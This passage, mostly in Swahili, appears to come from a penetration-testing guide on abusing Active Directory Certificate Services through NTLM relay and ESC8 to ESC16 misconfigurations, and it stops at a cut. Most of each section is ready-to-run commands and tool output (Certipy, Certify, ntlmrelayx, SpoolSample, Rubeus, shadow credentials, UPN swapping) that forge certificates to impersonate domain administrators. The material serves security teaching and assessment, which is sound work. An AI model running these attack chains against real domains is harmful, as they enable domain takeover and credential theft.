Kizuizi kingine cha shambulizi za NTLM relay ni kwamba **kompyuta inayodhibitiwa na mshambuliaji lazima ithibitishwe na akaunti ya mwathirika**. Mshambuliaji anaweza kusubiri au kujaribu **kulazimisha** uthibitishaji huu:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Mali ya `msPKI-Enrollment-Servers` yanatumika na Mamlaka ya Vyeti ya biashara (CAs) kuhifadhi mwisho wa Huduma ya Usajili wa Vyeti (CES). Mwisho haya yanaweza kuchambuliwa na kuorodheshwa kwa kutumia chombo **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Unyanyasaji kwa kutumia Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuse with [Certipy](https://github.com/ly4k/Certipy)

Ombi la cheti linafanywa na Certipy kwa default kulingana na kigezo `Machine` au `User`, kinachotambulika kwa kuangalia kama jina la akaunti inayopitishwa linaishia na `$`. Mwelekeo wa kigezo mbadala unaweza kupatikana kupitia matumizi ya parameter `-template`.

Teknolojia kama [PetitPotam](https://github.com/ly4k/PetitPotam) inaweza kisha kutumika kulazimisha uthibitishaji. Wakati wa kushughulika na wasimamizi wa kikoa, mwelekeo wa `-template DomainController` unahitajika.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Maelezo

Thamani mpya **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) kwa **`msPKI-Enrollment-Flag`**, inayojulikana kama ESC9, inazuia kuingizwa kwa **nyongeza ya usalama mpya `szOID_NTDS_CA_SECURITY_EXT`** katika cheti. Bendera hii inakuwa muhimu wakati `StrongCertificateBindingEnforcement` imewekwa kuwa `1` (mipangilio ya kawaida), ambayo inapingana na mipangilio ya `2`. Umuhimu wake unazidi kuongezeka katika hali ambapo ramani dhaifu ya cheti kwa Kerberos au Schannel inaweza kutumika (kama katika ESC10), ikizingatiwa kwamba ukosefu wa ESC9 hauwezi kubadilisha mahitaji.

Masharti ambayo mipangilio ya bendera hii inakuwa muhimu ni pamoja na:

- `StrongCertificateBindingEnforcement` haijarekebishwa kuwa `2` (ikiwa mipangilio ya kawaida ni `1`), au `CertificateMappingMethods` inajumuisha bendera ya `UPN`.
- Cheti kimewekwa alama na bendera ya `CT_FLAG_NO_SECURITY_EXTENSION` ndani ya mipangilio ya `msPKI-Enrollment-Flag`.
- EKU yoyote ya uthibitishaji wa mteja imeainishwa na cheti.
- Ruhusa za `GenericWrite` zinapatikana juu ya akaunti yoyote ili kuathiri nyingine.

### Hali ya Kunyanyaswa

Fikiria `John@corp.local` ana ruhusa za `GenericWrite` juu ya `Jane@corp.local`, kwa lengo la kuathiri `Administrator@corp.local`. Kigezo cha cheti cha `ESC9`, ambacho `Jane@corp.local` inaruhusiwa kujiandikisha, kimewekwa na bendera ya `CT_FLAG_NO_SECURITY_EXTENSION` katika mipangilio yake ya `msPKI-Enrollment-Flag`.

Kwanza, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, shukrani kwa `GenericWrite` ya `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Kwa hivyo, `Jane`'s `userPrincipalName` inabadilishwa kuwa `Administrator`, ikikusudia kuacha sehemu ya kikoa `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Hii marekebisho hayakiuka vikwazo, kwa kuwa `Administrator@corp.local` inabaki kuwa tofauti kama `userPrincipalName` wa `Administrator`.

Baada ya hii, kiolezo cha cheti `ESC9`, kilichotajwa kuwa na udhaifu, kinahitajika kama `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Imepangwa kwamba `userPrincipalName` wa cheti unadhihirisha `Administrator`, bila “object SID” yoyote.

`Jane`'s `userPrincipalName` kisha inarudishwa kwa yake ya awali, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kujaribu uthibitishaji na cheti kilichotolewa sasa kunatoa NT hash ya `Administrator@corp.local`. Amri lazima ijumuisha `-domain <domain>` kutokana na ukosefu wa maelezo ya kikoa katika cheti:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Mifumo ya Cheti Dhaifu - ESC10

### Maelezo

Thamani mbili za funguo za rejista kwenye kidhibiti cha eneo zinarejelewa na ESC10:

- Thamani ya default kwa `CertificateMappingMethods` chini ya `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` ni `0x18` (`0x8 | 0x10`), hapo awali ilikua `0x1F`.
- Mpangilio wa default kwa `StrongCertificateBindingEnforcement` chini ya `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` ni `1`, hapo awali `0`.

**Kesi ya 1**

Wakati `StrongCertificateBindingEnforcement` imewekwa kama `0`.

**Kesi ya 2**

Ikiwa `CertificateMappingMethods` inajumuisha bit ya `UPN` (`0x4`).

### Kesi ya Kunyanyaswa 1

Pamoja na `StrongCertificateBindingEnforcement` iliyowekwa kama `0`, akaunti A yenye ruhusa za `GenericWrite` inaweza kutumika kuathiri akaunti yoyote B.

Kwa mfano, ikiwa na ruhusa za `GenericWrite` juu ya `Jane@corp.local`, mshambuliaji anaimarisha kuathiri `Administrator@corp.local`. Utaratibu unafanana na ESC9, ukiruhusu kutumia kiolezo chochote cha cheti.

Kwanza, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, ikitumia `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Kisha, `Jane`'s `userPrincipalName` inabadilishwa kuwa `Administrator`, kwa makusudi ikiacha sehemu ya `@corp.local` ili kuepuka ukiukaji wa kizuizi.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Kufuata hili, cheti kinachowezesha uthibitishaji wa mteja kinahitajika kama `Jane`, kwa kutumia kigezo cha `User` kilichowekwa kuwa chaguo-msingi.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` inarudishwa kwa asili yake, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kuthibitisha na cheti kilichopatikana kutatoa hash ya NT ya `Administrator@corp.local`, ikihitaji kuweka jina la eneo katika amri kutokana na ukosefu wa maelezo ya eneo katika cheti.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

Ikiwa `CertificateMappingMethods` ina bendera ya `UPN` (`0x4`), akaunti A yenye ruhusa za `GenericWrite` inaweza kuathiri akaunti yoyote B isiyo na mali ya `userPrincipalName`, ikiwa ni pamoja na akaunti za mashine na msimamizi wa ndani wa domain `Administrator`.

Hapa, lengo ni kuathiri `DC$@corp.local`, kuanzia na kupata hash ya `Jane` kupitia Shadow Credentials, ikitumia `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'s `userPrincipalName` kisha inawekwa kuwa `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Cheti cha uthibitishaji wa mteja kinahitajika kama `Jane` kwa kutumia kigezo cha kawaida `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` inarudi kwenye hali yake ya awali baada ya mchakato huu.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Ili kuthibitisha kupitia Schannel, chaguo la `-ldap-shell` la Certipy linatumika, likionyesha mafanikio ya uthibitishaji kama `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Kupitia shell ya LDAP, amri kama `set_rbcd` zinawezesha mashambulizi ya Resource-Based Constrained Delegation (RBCD), ambayo yanaweza kuhatarisha kidhibiti cha eneo.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Hali hii ya usalama pia inahusisha akaunti yoyote ya mtumiaji isiyo na `userPrincipalName` au ambapo haifanani na `sAMAccountName`, huku `Administrator@corp.local` ikiwa lengo kuu kutokana na haki zake za juu za LDAP na ukosefu wa `userPrincipalName` kwa kawaida.

## Relaying NTLM to ICPR - ESC11

### Maelezo

Ikiwa CA Server haijasanidiwa na `IF_ENFORCEENCRYPTICERTREQUEST`, inaweza kufanya mashambulizi ya NTLM relay bila kusaini kupitia huduma ya RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Unaweza kutumia `certipy` kuorodhesha ikiwa `Enforce Encryption for Requests` imezimwa na certipy itaonyesha `ESC11` Vulnerabilities.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

Inahitajika kuweka seva ya relay:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Kumbuka: Kwa waangalizi wa kikoa, lazima tuweke `-template` katika DomainController.

Au kutumia [sploutchy's fork of impacket](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

Wasimamizi wanaweza kuanzisha Mamlaka ya Cheti ili kuihifadhi kwenye kifaa cha nje kama "Yubico YubiHSM2".

Ikiwa kifaa cha USB kimeunganishwa kwenye seva ya CA kupitia bandari ya USB, au seva ya kifaa cha USB katika kesi ambapo seva ya CA ni mashine ya virtual, funguo ya uthibitishaji (wakati mwingine inaitwa "nenosiri") inahitajika kwa Mtoa Huduma wa Hifadhi ya Funguo ili kuunda na kutumia funguo katika YubiHSM.

Funguo/hifadhi hii inahifadhiwa katika rejista chini ya `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` kwa maandiko wazi.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

Ikiwa funguo ya faragha ya CA imehifadhiwa kwenye kifaa halisi cha USB wakati umepata ufikiaji wa shell, inawezekana kurejesha funguo hiyo.

Kwanza, unahitaji kupata cheti cha CA (hiki ni cha umma) na kisha:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Hatimaye, tumia amri ya certutil `-sign` kuunda cheti kipya cha kiholela kwa kutumia cheti cha CA na funguo zake za faragha.

## OID Group Link Abuse - ESC13

### Maelezo

Attribute ya `msPKI-Certificate-Policy` inaruhusu sera ya utoaji kuongezwa kwenye kigezo cha cheti. Vitu vya `msPKI-Enterprise-Oid` vinavyohusika na utoaji wa sera vinaweza kupatikana katika Muktadha wa Uwekaji wa Mipangilio (CN=OID,CN=Public Key Services,CN=Services) wa kontena la PKI OID. Sera inaweza kuunganishwa na kundi la AD kwa kutumia attribute ya `msDS-OIDToGroupLink` ya kitu hiki, ikiruhusu mfumo kumruhusu mtumiaji anayeleta cheti kana kwamba yeye ni mwanachama wa kundi hilo. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Kwa maneno mengine, wakati mtumiaji ana ruhusa ya kujiandikisha kwa cheti na cheti kinaunganishwa na kundi la OID, mtumiaji anaweza kurithi mamlaka ya kundi hili.

Tumia [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kupata OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

Pata ruhusa ya mtumiaji ambayo inaweza kutumia `certipy find` au `Certify.exe find /showAllPermissions`.

Ikiwa `John` ana ruhusa ya kujiandikisha `VulnerableTemplate`, mtumiaji anaweza kurithi haki za kundi la `VulnerableGroup`.

Kila kinachohitajika ni kutaja template, itapata cheti chenye haki za OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Vulnerable Certificate Renewal Configuration- ESC14

### Explanation

Maelezo kwenye https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping ni ya kina sana. Hapa chini kuna nukuu ya maandiko ya asili.

ESC14 inashughulikia udhaifu unaotokana na "michakato dhaifu ya wazi ya leseni", hasa kupitia matumizi mabaya au usanidi usio salama wa sifa ya `altSecurityIdentities` kwenye akaunti za mtumiaji au kompyuta za Active Directory. Sifa hii yenye thamani nyingi inawawezesha wasimamizi kuunganisha kwa mikono leseni za X.509 na akaunti ya AD kwa madhumuni ya uthibitishaji. Wakati inapojaa, michakato hii ya wazi inaweza kubadilisha mantiki ya kawaida ya michakato ya leseni, ambayo kwa kawaida inategemea UPNs au majina ya DNS katika SAN ya leseni, au SID iliyojumuishwa katika kiambatisho cha usalama `szOID_NTDS_CA_SECURITY_EXT`.

"Mchakato dhaifu" hutokea wakati thamani ya mfuatano inayotumika ndani ya sifa ya `altSecurityIdentities` kutambua leseni ni pana sana, rahisi kudhaniwa, inategemea mashamba yasiyo ya kipekee ya leseni, au inatumia vipengele vya leseni ambavyo vinaweza kudanganywa kwa urahisi. Ikiwa mshambuliaji anaweza kupata au kuunda leseni ambayo sifa zake zinakidhi mchakato dhaifu wa wazi wa akaunti yenye mamlaka, wanaweza kutumia leseni hiyo kuthibitisha kama na kuiga akaunti hiyo.

Mifano ya mfuatano wa `altSecurityIdentities` ambao unaweza kuwa dhaifu ni pamoja na:

- Mchakato kwa kutumia jina la kawaida la Mhusika (CN): e.g., `X509:<S>CN=SomeUser`. Mshambuliaji anaweza kuwa na uwezo wa kupata leseni yenye CN hii kutoka chanzo kisicho salama.
- Kutumia Majina ya Mtoaji yasiyo maalum (DNs) au Majina ya Mhusika bila sifa zaidi kama nambari maalum ya serial au kitambulisho cha funguo za mhusika: e.g., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Kutumia mifumo mingine inayoweza kutabiriwa au vitambulisho visivyo vya kiusalama ambavyo mshambuliaji anaweza kutimiza katika leseni wanayoweza kupata au kudanganya (ikiwa wamevamia CA au kupata templeti dhaifu kama ilivyo katika ESC1).

Sifa ya `altSecurityIdentities` inasaidia mifumo mbalimbali ya mchakato, kama vile:

- `X509:<I>IssuerDN<S>SubjectDN` (inachanganya kwa Mtoaji kamili na DN ya Mhusika)
- `X509:<SKI>SubjectKeyIdentifier` (inachanganya kwa thamani ya kiambatisho cha Kitambulisho cha Funguo za Mhusika wa leseni)
- `X509:<SR>SerialNumberBackedByIssuerDN` (inachanganya kwa nambari ya serial, kwa njia isiyo ya moja kwa moja inayoainishwa na Mtoaji DN) - hii si muundo wa kawaida, kwa kawaida ni `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (inachanganya kwa jina la RFC822, kwa kawaida anwani ya barua pepe, kutoka SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (inachanganya kwa hash ya SHA1 ya funguo ya umma ya leseni - kwa ujumla ni imara)

Usalama wa michakato hii unategemea sana usahihi, upekee, na nguvu za kiusalama za vitambulisho vya leseni vilivyochaguliwa vinavyotumika katika mfuatano wa mchakato. Hata na hali za nguvu za kuunganisha leseni zikiwa zimewezeshwa kwenye Watawala wa Kikoa (ambazo kwa kawaida zinaathiri michakato isiyo ya moja kwa moja inayotegemea SAN UPNs/DNS na kiambatisho cha SID), kuingia kwa `altSecurityIdentities` iliyosanidiwa vibaya bado kunaweza kuwasilisha njia ya moja kwa moja ya kuiga ikiwa mantiki ya mchakato yenyewe ina kasoro au ni ya kupitisha sana.
### Abuse Scenario

ESC14 inalenga **michakato ya wazi ya leseni** katika Active Directory (AD), hasa sifa ya `altSecurityIdentities`. Ikiwa sifa hii imewekwa (kwa muundo au usanidi mbaya), washambuliaji wanaweza kuiga akaunti kwa kuwasilisha leseni zinazolingana na mchakato.

#### Scenario A: Mshambuliaji Anaweza Kuandika kwenye `altSecurityIdentities`

**Sharti**: Mshambuliaji ana ruhusa ya kuandika kwenye sifa ya `altSecurityIdentities` ya akaunti lengwa au ruhusa ya kuipa katika mfumo wa moja ya ruhusa zifuatazo kwenye kitu cha AD kilicholengwa:
- Andika mali `altSecurityIdentities`
- Andika mali `Public-Information`
- Andika mali (zote)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Mmiliki*.
#### Scenario B: Lengo Lina Mchakato Dhaifu kupitia X509RFC822 (Barua pepe)

- **Sharti**: Lengo lina mchakato dhaifu wa X509RFC822 katika altSecurityIdentities. Mshambuliaji anaweza kuweka sifa ya barua ya mwathirika ili iendane na jina la X509RFC822 la lengo, kujiandikisha leseni kama mwathirika, na kuitumia kuthibitisha kama lengo.
#### Scenario C: Lengo Lina Mchakato wa X509IssuerSubject

- **Sharti**: Lengo lina mchakato dhaifu wa wazi wa X509IssuerSubject katika `altSecurityIdentities`. Mshambuliaji anaweza kuweka sifa ya `cn` au `dNSHostName` kwenye kanuni ya mwathirika ili iendane na mhusika wa mchakato wa X509IssuerSubject wa lengo. Kisha, mshambuliaji anaweza kujiandikisha leseni kama mwathirika, na kutumia leseni hii kuthibitisha kama lengo.
#### Scenario D: Lengo Lina Mchakato wa X509SubjectOnly

- **Sharti**: Lengo lina mchakato dhaifu wa wazi wa X509SubjectOnly katika `altSecurityIdentities`. Mshambuliaji anaweza kuweka sifa ya `cn` au `dNSHostName` kwenye kanuni ya mwathirika ili iendane na mhusika wa mchakato wa X509SubjectOnly wa lengo. Kisha, mshambuliaji anaweza kujiandikisha leseni kama mwathirika, na kutumia leseni hii kuthibitisha kama lengo.
### concrete operations
#### Scenario A

Omba leseni ya templeti ya leseni `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Hifadhi na kubadilisha cheti
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Thibitisha (ukitumia cheti)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Safisha (hiari)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Kwa mbinu maalum za shambulio katika hali mbalimbali za shambulio, tafadhali rejelea yafuatayo: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## Sera za Maombi za EKUwu (CVE-2024-49019) - ESC15

### Maelezo

Maelezo kwenye https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc ni ya kina sana. Hapa chini kuna nukuu ya maandiko ya asili.

Kwa kutumia templeti za cheti za toleo la 1 zilizojengwa ndani, mshambuliaji anaweza kuunda CSR ili kujumuisha sera za maombi ambazo zinapewa kipaumbele zaidi kuliko sifa za Matumizi ya Funguo ya Kupanuliwa zilizowekwa kwenye templeti. Sharti pekee ni haki za kujiandikisha, na inaweza kutumika kuzalisha uthibitisho wa mteja, wakala wa ombi la cheti, na cheti za kusaini msimbo kwa kutumia templeti ya **_WebServer_**.

### Unyanyasaji

Yafuatayo yanarejelea [kiungo hiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu), Bonyeza kuona mbinu za matumizi zilizoelezwa kwa undani zaidi.

Amri ya `find` ya Certipy inaweza kusaidia kubaini templeti za V1 ambazo zinaweza kuwa hatarini kwa ESC15 ikiwa CA haijarekebishwa.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Direct Impersonation via Schannel

**Step 1: Request a certificate, injecting "Client Authentication" Application Policy and target UPN.** Mshambuliaji `attacker@corp.local` anawalenga `administrator@corp.local` akitumia kigezo cha "WebServer" V1 (ambacho kinaruhusu mjiandikishaji kutoa somo).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Kigezo dhaifu cha V1 chenye "Mji wa kujiandikisha unatoa somo".
- `-application-policies 'Client Authentication'`: Inatia OID `1.3.6.1.5.5.7.3.2` katika nyongeza ya Sera za Maombi ya CSR.
- `-upn 'administrator@corp.local'`: Inaweka UPN katika SAN kwa ajili ya kujifanya.

**Step 2: Authenticate via Schannel (LDAPS) using the obtained certificate.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Step 1: Omba cheti kutoka kwa kiolezo cha V1 (pamoja na "Mwandikaji anatoa mada"), ukichanganya "Sera ya Ombi la Cheti" ya Programu.** Cheti hiki ni kwa mshambuliaji (`attacker@corp.local`) kuwa wakala wa usajili. Hakuna UPN iliyotajwa kwa kitambulisho cha mshambuliaji hapa, kwani lengo ni uwezo wa wakala.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Inajumuisha OID `1.3.6.1.4.1.311.20.2.1`.

**Hatua ya 2: Tumia cheti cha "agent" kuomba cheti kwa niaba ya mtumiaji mwenye mamlaka.** Hii ni hatua kama ya ESC3, ikitumia cheti kutoka Hatua ya 1 kama cheti cha agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Hatua ya 3: Thibitisha kama mtumiaji mwenye mamlaka kwa kutumia cheti cha "kwa niaba ya".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Explanation

**ESC16 (Kuinua Mamlaka kupitia Kukosekana kwa szOID_NTDS_CA_SECURITY_EXT Extension)** inahusisha hali ambapo, ikiwa usanidi wa AD CS haukuthibitisha kujumuishwa kwa **szOID_NTDS_CA_SECURITY_EXT** extension katika vyeti vyote, mshambuliaji anaweza kutumia hii kwa:

1. Kuomba cheti **bila SID binding**.

2. Kutumia cheti hiki **kwa uthibitisho kama akaunti yoyote**, kama vile kujifanya kuwa akaunti yenye mamlaka ya juu (mfano, Msimamizi wa Kikoa).

You can also refer to this article to learn more about the detailed principle:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuse

The following is referenced to [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),Click to see more detailed usage methods.

To identify whether the Active Directory Certificate Services (AD CS) environment is vulnerable to **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Hatua ya 1: Soma UPN ya awali ya akaunti ya mwathirika (Hiari - kwa urejeleaji).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Hatua ya 2: Sasisha UPN wa akaunti ya mwathirika kwa `sAMAccountName` ya msimamizi wa lengo.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Hatua ya 3: (Ikiwa inahitajika) Pata akreditivu za akaunti ya "madhara" (mfano, kupitia Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Hatua ya 4: Omba cheti kama mtumiaji "mhasiriwa" kutoka _kigezo chochote cha uthibitishaji wa mteja_ (mfano, "Mtumiaji") kwenye CA iliyo hatarini ya ESC16.** Kwa sababu CA ina udhaifu wa ESC16, itakosa kiotomatiki kiambatisho cha usalama cha SID kutoka kwa cheti kilichotolewa, bila kujali mipangilio maalum ya kigezo hiki kwa kiambatisho. Weka mabadiliko ya mazingira ya cache ya akidi ya Kerberos (amri ya shell):
```bash
export KRB5CCNAME=victim.ccache
```
Kisha omba cheti:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Hatua ya 5: Rudisha UPN wa akaunti ya "mwathirika".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Hatua ya 6: Thibitisha kama msimamizi wa lengo.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Kupata Miti kwa Vyeti Iliyofafanuliwa kwa Sauti ya Kupita

### Kuvunjika kwa Imani za Miti na CAs Zilizoshindwa

